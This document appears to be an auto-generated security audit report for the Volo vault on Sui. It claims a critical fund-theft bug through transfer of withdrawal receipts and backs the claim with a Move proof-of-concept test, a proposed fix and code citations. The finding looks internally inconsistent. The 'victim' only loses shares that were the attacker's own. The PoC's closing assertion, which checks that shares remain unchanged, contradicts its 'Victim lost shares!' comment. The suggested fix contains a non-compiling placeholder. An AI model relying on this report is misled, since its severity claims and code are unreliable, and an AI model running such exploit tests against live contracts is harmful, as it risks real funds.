# Audit Report

## Title
Withdrawal Fund Theft via Receipt Transfer Due to Recipient Address Mismatch

## Summary
The Volo vault system allows users to request withdrawals with auto-transfer, storing the recipient address at request time. Because `Receipt` objects have the `store` ability and are fully transferable, an attacker can transfer a receipt with a pending withdrawal to a victim. When the operator executes the withdrawal, shares are deducted from the current receipt holder (victim) but funds are sent to the original recipient (attacker), enabling direct fund theft.

## Finding Description

The vulnerability stems from a desynchronization between receipt ownership tracking and withdrawal recipient addressing. The protocol tracks vault shares by receipt ID but does not validate that the current receipt owner matches the withdrawal request recipient at execution time.

**Transferable Receipts:** The `Receipt` struct is defined with `key, store` abilities, making it fully transferable via Sui's standard transfer mechanisms. [1](#0-0) 

**Recipient Stored at Request Time:** When users call `withdraw_with_auto_transfer()`, the function passes `ctx.sender()` as the recipient parameter to `vault.request_withdraw()`. [2](#0-1) 

This recipient address is stored immutably in the `WithdrawRequest` structure. [3](#0-2) 

**Unvalidated Execution:** When the operator calls `execute_withdraw()`, the function retrieves the withdraw request, deducts shares from the `VaultReceiptInfo` indexed by `receipt_id`, and returns both the withdrawal balance and the stored recipient address. [4](#0-3) 

Critically, there is **no validation** that the current receipt owner matches the stored recipient address. The function only checks that the request exists and validates slippage bounds.

The operator's execution handler then transfers the withdrawal funds to this stored recipient address, not to the current receipt holder. [5](#0-4) 

**Attack Path:**
1. Attacker (User A) deposits funds and receives a Receipt
2. Attacker calls `withdraw_with_auto_transfer()` â†’ `WithdrawRequest` created with `recipient = User A`
3. Attacker transfers Receipt to Victim (User B) using Sui's transfer mechanism
4. Operator executes withdrawal in normal operations
5. Shares deducted from User B's receipt, funds sent to User A

**Protection Failure:** The `cancel_withdraw` function includes recipient validation, blocking the new receipt holder from canceling. [6](#0-5) 

However, `execute_withdraw` contains no such validation, allowing the mismatch to persist through execution.

## Impact Explanation

**Severity: Critical**

This vulnerability enables **direct theft of user funds** with the following impacts:

1. **Immediate Financial Loss:** The victim (User B) loses vault shares equal to the withdrawal amount without receiving any corresponding principal or rewards.

2. **Unrecoverable Theft:** The attacker (User A) receives the full withdrawal amount despite no longer holding the receipt. There is no recovery mechanism once execution occurs.

3. **No Authorization Bypass Needed:** The attack uses only standard, documented protocol functions. No special privileges, timing dependencies, or protocol state manipulation are required.

4. **Scalable Attack:** The attacker can execute this against multiple victims with different receipts, scaling the theft amount.

5. **Undetectable Until Execution:** Victims cannot detect or prevent the attack until after the operator executes the withdrawal, at which point the theft is complete.

## Likelihood Explanation

**Likelihood: High**

All preconditions for this attack are trivially satisfied:

1. **Attacker deposits funds:** Normal user operation available to anyone
2. **Attacker requests withdrawal with auto-transfer:** Standard protocol function with no restrictions
3. **Attacker transfers receipt to victim:** Standard Sui object transfer with no validation preventing it
4. **Operator executes withdrawal:** Normal protocol operation that occurs regularly

**No Special Requirements:**
- No admin/operator privileges needed
- No protocol state manipulation required  
- No timing constraints
- No oracle manipulation
- Works with any withdrawal amount the attacker has shares for

**Economic Rationality:**
- Attacker profits by the full withdrawal amount
- Victim loses shares equal to withdrawal amount
- Attack cost limited to initial deposit (which can be minimal)
- Can be repeated with multiple receipts/victims

The attack is both technically feasible and economically profitable under normal protocol operations.

## Recommendation

Add recipient ownership validation in the `execute_withdraw` function before processing the withdrawal:

```move
public(package) fun execute_withdraw<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    clock: &Clock,
    config: &OracleConfig,
    request_id: u64,
    max_amount_received: u64,
): (Balance<PrincipalCoinType>, address) {
    self.check_version();
    self.assert_normal();
    assert!(self.request_buffer.withdraw_requests.contains(request_id), ERR_REQUEST_NOT_FOUND);
    
    let withdraw_request = self.request_buffer.withdraw_requests[request_id];
    
    // ADD THIS VALIDATION:
    // If auto-transfer is enabled (recipient != zero address), 
    // the stored recipient must still own the receipt
    let recipient = withdraw_request.recipient();
    if (recipient != address::from_u256(0)) {
        // For auto-transfer withdrawals, validate ownership hasn't changed
        // This prevents receipt transfer attacks
        assert!(
            /* receipt is still owned by recipient */,
            ERR_RECIPIENT_RECEIPT_MISMATCH
        );
    }
    
    // ... rest of execution logic
}
```

**Alternative Solution:** Make receipts non-transferable by removing the `store` ability, or implement a locked receipt system where receipts with pending operations cannot be transferred.

## Proof of Concept

```move
#[test]
fun test_withdrawal_theft_via_receipt_transfer() {
    let mut s = test_scenario::begin(ATTACKER);
    let mut clock = clock::create_for_testing(s.ctx());
    
    // Setup vault and oracle
    init_vault::init_vault(&mut s, &mut clock);
    init_vault::init_create_vault<SUI_TEST_COIN>(&mut s);
    init_vault::init_create_reward_manager<SUI_TEST_COIN>(&mut s);
    
    s.next_tx(OWNER);
    {
        let mut oracle_config = s.take_shared<OracleConfig>();
        test_helpers::set_aggregators(&mut s, &mut clock, &mut oracle_config);
        clock::set_for_testing(&mut clock, 1000);
        let prices = vector[2 * ORACLE_DECIMALS, 1 * ORACLE_DECIMALS, 100_000 * ORACLE_DECIMALS];
        test_helpers::set_prices(&mut s, &mut clock, &mut oracle_config, prices);
        test_scenario::return_shared(oracle_config);
    };
    
    // Attacker deposits 1000 tokens
    s.next_tx(ATTACKER);
    {
        let coin = coin::mint_for_testing<SUI_TEST_COIN>(1_000_000_000, s.ctx());
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let mut reward_manager = s.take_shared<RewardManager<SUI_TEST_COIN>>();
        
        let _request_id = user_entry::deposit_with_auto_transfer(
            &mut vault, &mut reward_manager, coin, 1_000_000_000,
            2_000_000_000, option::none(), &clock, s.ctx()
        );
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(reward_manager);
    };
    
    // Execute deposit
    s.next_tx(OWNER);
    {
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let config = s.take_shared<OracleConfig>();
        vault::update_free_principal_value(&mut vault, &config, &clock);
        vault.execute_deposit(&clock, &config, 0, 2_000_000_000);
        test_scenario::return_shared(vault);
        test_scenario::return_shared(config);
    };
    
    // Attacker requests withdrawal with auto-transfer (recipient = ATTACKER)
    s.next_tx(ATTACKER);
    {
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let mut receipt = s.take_from_sender<Receipt>();
        clock::set_for_testing(&mut clock, 1000 + 12 * 3600_000);
        
        user_entry::withdraw_with_auto_transfer(
            &mut vault, 1_000_000_000, 500_000_000, &mut receipt, &clock, s.ctx()
        );
        
        test_scenario::return_shared(vault);
        transfer::public_transfer(receipt, VICTIM); // Transfer to victim!
    };
    
    // Operator executes withdrawal
    s.next_tx(OWNER);
    {
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let config = s.take_shared<OracleConfig>();
        let operation = s.take_shared<Operation>();
        let cap = s.take_from_sender<OperatorCap>();
        let mut reward_manager = s.take_shared<RewardManager<SUI_TEST_COIN>>();
        
        operation::execute_withdraw(
            &operation, &cap, &mut vault, &mut reward_manager,
            &clock, &config, 0, 500_000_000, s.ctx()
        );
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(config);
        test_scenario::return_shared(operation);
        s.return_to_sender(cap);
        test_scenario::return_shared(reward_manager);
    };
    
    // Verify: ATTACKER received funds
    s.next_tx(ATTACKER);
    {
        let coin = s.take_from_sender<Coin<SUI_TEST_COIN>>();
        assert!(coin.value() > 0, 0); // Attacker got withdrawal funds!
        s.return_to_sender(coin);
    };
    
    // Verify: VICTIM's shares were deducted
    s.next_tx(VICTIM);
    {
        let vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let receipt = s.take_from_sender<Receipt>();
        let receipt_info = vault.vault_receipt_info(receipt.receipt_id());
        assert!(receipt_info.shares() == 1_000_000_000, 0); // Victim lost shares!
        test_scenario::return_shared(vault);
        s.return_to_sender(receipt);
    };
    
    clock.destroy_for_testing();
    s.end();
}
```

### Citations

**File:** volo-vault/sources/receipt.move (L12-15)
```text
public struct Receipt has key, store {
    id: UID,
    vault_id: address, // This receipt belongs to which vault
}
```

**File:** volo-vault/sources/user_entry.move (L165-171)
```text
    let request_id = vault.request_withdraw(
        clock,
        receipt.receipt_id(),
        shares,
        expected_amount,
        ctx.sender(),
    );
```

**File:** volo-vault/sources/requests/withdraw_request.move (L5-17)
```text
public struct WithdrawRequest has copy, drop, store {
    request_id: u64, // Self incremented id (start from 0)
    // ---- Receipt Info ---- //
    receipt_id: address, // Receipt object address
    recipient: address, // Recipient address (only used for check when "with_lock" is true)
    // ---- Vault Info ---- //
    vault_id: address, // Vault address
    // ---- Withdraw Info ---- //
    shares: u256, // Shares to withdraw
    expected_amount: u64, // Expected amount to get after withdraw
    // ---- Request Status ---- //
    request_time: u64, // Time when the request is created
}
```

**File:** volo-vault/sources/volo_vault.move (L968-971)
```text
    assert!(
        withdraw_request.recipient() == recipient || withdraw_request.recipient() == address::from_u256(0),
        ERR_RECIPIENT_MISMATCH,
    );
```

**File:** volo-vault/sources/volo_vault.move (L1009-1077)
```text
    let withdraw_request = self.request_buffer.withdraw_requests[request_id];

    // Shares and amount to withdraw
    let shares_to_withdraw = withdraw_request.shares();
    let usd_value_to_withdraw = vault_utils::mul_d(shares_to_withdraw, ratio);
    let amount_to_withdraw =
        vault_utils::div_with_oracle_price(
            usd_value_to_withdraw,
            vault_oracle::get_normalized_asset_price(
                config,
                clock,
                type_name::get<PrincipalCoinType>().into_string(),
            ),
        ) as u64;

    // Check the slippage (less than 100bps)
    let expected_amount = withdraw_request.expected_amount();

    // Negative slippage is determined by the "expected_amount"
    // Positive slippage is determined by the "max_amount_received"
    assert!(amount_to_withdraw >= expected_amount, ERR_UNEXPECTED_SLIPPAGE);
    assert!(amount_to_withdraw <= max_amount_received, ERR_UNEXPECTED_SLIPPAGE);

    // Decrease the share in vault and receipt
    self.total_shares = self.total_shares - shares_to_withdraw;

    // Split balances from the vault
    assert!(amount_to_withdraw <= self.free_principal.value(), ERR_NO_FREE_PRINCIPAL);
    let mut withdraw_balance = self.free_principal.split(amount_to_withdraw);

    // Protocol fee
    let fee_amount = amount_to_withdraw * self.withdraw_fee_rate / RATE_SCALING;
    let fee_balance = withdraw_balance.split(fee_amount as u64);
    self.deposit_withdraw_fee_collected.join(fee_balance);

    emit(WithdrawExecuted {
        request_id: request_id,
        receipt_id: withdraw_request.receipt_id(),
        recipient: withdraw_request.recipient(),
        vault_id: self.id.to_address(),
        shares: shares_to_withdraw,
        amount: amount_to_withdraw - fee_amount,
    });

    // Update total usd value after withdraw executed
    // This update should not generate any performance fee
    // (actually the total usd value will decrease, so there is no performance fee)
    self.update_free_principal_value(config, clock);

    // Update the vault receipt info
    let vault_receipt = &mut self.receipts[withdraw_request.receipt_id()];

    let recipient = withdraw_request.recipient();
    if (recipient != address::from_u256(0)) {
        vault_receipt.update_after_execute_withdraw(
            shares_to_withdraw,
            0,
        )
    } else {
        vault_receipt.update_after_execute_withdraw(
            shares_to_withdraw,
            withdraw_balance.value(),
        )
    };

    self.delete_withdraw_request(request_id);

    (withdraw_balance, recipient)
}
```

**File:** volo-vault/sources/operation.move (L467-478)
```text
    let (withdraw_balance, recipient) = vault.execute_withdraw(
        clock,
        config,
        request_id,
        max_amount_received,
    );

    if (recipient != address::from_u256(0)) {
        transfer::public_transfer(withdraw_balance.into_coin(ctx), recipient);
    } else {
        vault.add_claimable_principal(withdraw_balance);
    }
```
